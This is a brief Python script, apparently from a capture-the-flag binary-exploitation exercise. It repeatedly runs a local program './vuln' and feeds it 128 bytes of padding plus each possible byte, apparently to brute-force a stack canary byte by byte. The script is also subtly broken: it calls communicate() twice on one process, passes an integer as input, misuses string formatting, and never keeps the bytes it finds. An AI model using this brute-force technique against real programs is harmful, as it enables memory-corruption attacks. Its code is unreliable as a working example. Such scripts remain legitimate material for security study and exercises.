import subprocess

junk = "ABCD" * 32
input_len = 129
for j in range(4):
    
    for i in range (256):
        input_term = junk + chr(i)
        
        process = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr = subprocess.PIPE)
        output = process.communicate(input=input_len)[0]
        if ("Now enter the string" in output):
            output = process.communicate(input=input_term)[0]
        else:
            print("sth is wrong")
            exit(1)
        if ("hacker" in output):
            input_term = input_term[:-1]
            continue
        else:
            print("Find correct one %d".format(i))
        
    input_len += 1
print(junk)
